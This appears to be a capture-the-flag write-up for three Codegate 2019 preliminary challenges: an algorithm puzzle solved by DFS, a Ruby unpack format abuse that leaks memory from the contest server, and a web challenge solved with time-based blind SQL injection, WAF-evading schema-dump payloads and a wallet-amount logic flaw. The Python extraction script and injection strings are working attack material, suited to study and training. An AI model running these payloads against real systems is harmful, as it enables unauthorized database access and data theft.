Codegate 2019 Preliminary
===

[](https://github.com/w181496/CTF/blob/master/codegate-2019-pre/img3.png)

# algo_auth

easy algorithm problem

we can use DFS to bruteforce the answer.

here is my code(C++):

```cpp
#include <iostream>
using namespace std;

int best = 1e8;
int mx[7][7];

void dfs(int x, int y, int val) {

    if(val + mx[x][y] > best) return;

    if(x == 6) 
        best = min(best, val + mx[x][y]);
    if(x > 6 || x < 0 || y > 6 || y < 0) {
        if(x > 6 || (x == 6 && y < 0) || (x ==6 && y > 6)) 
            best = min(val, best);
        return;
    }

    dfs(x + 1, y, val + mx[x][y]);
    dfs(x, y - 1, val + mx[x][y]);
    dfs(x, y + 1, val + mx[x][y]);

}

int main() {
    ios_base::sync_with_stdio(0);
    for(int i = 0; i < 7; i++)
        for(int j = 0; j < 7; j++)
            cin >> mx[j][i];

    for(int i = 0; i < 7; ++i)
        dfs(0, i, 0);

    cout << best << endl;

    return 0;
}

```

After solving 100 stages, I got this message: `@@@@@ Congratz! Your answers are an answer`

But this is not flag.

<br>

In every stage, we can get a number of smallest path sum.

And this value will not change in different connections.

So I try to convert the numbers(ascii code) to characters in every stages, and I got this base64 string: `RkxBRyA6IGcwMG9vT09kX2owQiEhIV9fX3VuY29tZm9ydDRibGVfX3MzY3VyaXR5X19pc19fbjB0X180X19zZWN1cml0eSEhISEh`

Decode it, and get flag:

`echo RkxBRyA6IGcwMG9vT09kX2owQiEhIV9fX3VuY29tZm9ydDRibGVfX3MzY3VyaXR5X19pc19fbjB0X180X19zZWN1cml0eSEhISEh | base64 -d`

`FLAG : g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!!`

# mini converter

The problem is on `puts input.unpack("C*#{input}.length")`

It put `input` to the string of unpack

So we can control the result of unpack to leak flag.

In Ruby unpack format, `@` can `skip to the offset given by the length argument`

If we assign a large positive number to it, the number will overflow to negative number.

Then we can leak previous content, including the `flag`.

Payload:

`nc 110.10.147.105 12137 | strings | grep flag`

and then paste `@18446744073708410316A1150000`, `1` repeatedly.

```
$ nc 110.10.147.105 12137 | strings | grep flag
@18446744073708410316A1150000
1

$(cflags)  -fPIC
 $(DEFS) $(cppflags)
$(cxxflags)
DEFS) $(cppflags)
cflags
cppflags
cxxflags
optflags
debugflags
warnflags
strict_warnflags
flags

@18446744073708410316A1150000
1

flag
flag
$(optflags) $(debugflags) $(warnflags)
flag = "FLAG{Run away with me.It'll be the way you want it}"
```


# Rich Project

After scanning, I found:

`http://110.10.147.112/robots.txt`

```
User-agent : *
Disallow: /top_secret.zip
Disallow: /
```

But the zip file has an unknown password, and there is a file `ZIP PASS = MASTER_PW` in it.

So we need to find the MASTER's password first.

<br>

And then I found a SQL Injection in the register page. (http://110.10.147.112/?p=reg)

The point of SQL Injection is on `ac` parameter.

If we input `'||sleep(10)||'1` on `ac`, it will sleep 10 seconds.

So I guess the SQL query may look like `INSERT INTO xxx VALUES ('id', 'pw', 'ac')`

(after input `1'+'2`, the value of `ac` in `/?p=info` is `3`)

<br>

After fuzzing, I found that there is WAF behind the website. 

If I input `group_concat`, `group by`, `where`, `order`, `limit`, `'''`, `''''`, ..., the response text is `no hack`.

I can still dump some basic information by this script:

```python
import requests
import random
import time

while True:
    sql = raw_input(":")

    res = ''
    for tl in range(30):
        l = 20
        r = 140
        while l <= r:
            if l == r:
                res += chr(l)
                print(l, chr(l))
                print(res)
                break
            m = (l + r) // 2
            print "now:"+str(m)
            ac = "'||if(ascii(mid({},{},1))>{}, sleep(2),1)=1||'1".format(sql, tl+1, m)
            t1 = int(time.time())
            req = requests.post("http://110.10.147.112/?p=reg", data={'id':'kaizzzbro666'+str(random.randint(1,500)),'pw':'kaibro', 'ac':ac})
            # print r.text
            t2 = int(time.time())

            if t2 - t1 >= 2:
                l = m + 1
            else:
                r = m
```

```
user(): db_manager@localhost
database(): userdata
version(): 5.7.25-0ubuntu0.18.04.2
```

But it is a little hard to dump schema name, table name, column name by this script.

After discussing with my teammate @bookgin, we found a method can dump schema_name, table_name and column name.

- Dump table name

    - `0' |(select count(*) from (select table_schema,table_name from information_schema.tables having table_schema !="sys" and table_schema !="mysql" and table_schema !="performance_schema" and table_schema !="information_schema" and table_name regexp "[a-z].*") as b)| '0`

(if the regex pattern matches, the value of `ac` in the info page will show a number > 0)

- Dump column name
    - `0' |(select count(*) from (select column_name from information_schema.columns having table_name="users" and column_name regexp ".*") as b)| '0`

- Dump value
    - `0' |(select count(*) from (select id, pw from userdata.users having id="MASTER" and pw regexp ".*") as b)| '0` 

Result:

there is two tables in the `userdata` db:
- users
    - id
    - pw
    - ac
- user_wallet

And we found a user `MASTER` with password `master`, but this is fake user lol.

There is another user `admin` with password `hacker` and ac `ADMIN_ACC0UNTS`.

After login as `admin`, we can view the `TOP SECRET` now:

```
They are manipulating the price of coins!! 
How can this be? When I knew that, I decided to expose that.
Fortunately, I have a MASTER PASSWORD (not flag). It is..


'D0_N0T_RE1E@5E_0THER5'
Also, they have set up evidence to not be searched(googling). 
If you read this message, please found evidence and expose it.
```

so the password of zip file is `D0_N0T_RE1E@5E_0THER5`.

<br>

I found there is a logic vulnerabilty in `reserv.php` after code review.

we can assign arbitrary number to `$_POST['amount']` in `reserv.php`, and it will update the amount of `user_wallet`.

Then, we can sell our coin to gold in `sell.php`.

If we got cash >= 999999999, we can buy the flag in `pay.php`.

[](https://github.com/w181496/CTF/blob/master/codegate-2019-pre/img.png)

<br>

http://110.10.147.112/?key=D0_N0T_RE1E@5E_0THER5&p=pay

[](https://github.com/w181496/CTF/blob/master/codegate-2019-pre/img2.png)

`FLAG{H0LD_Y0UR_C0IN_T0_9999-O9-O9!}`



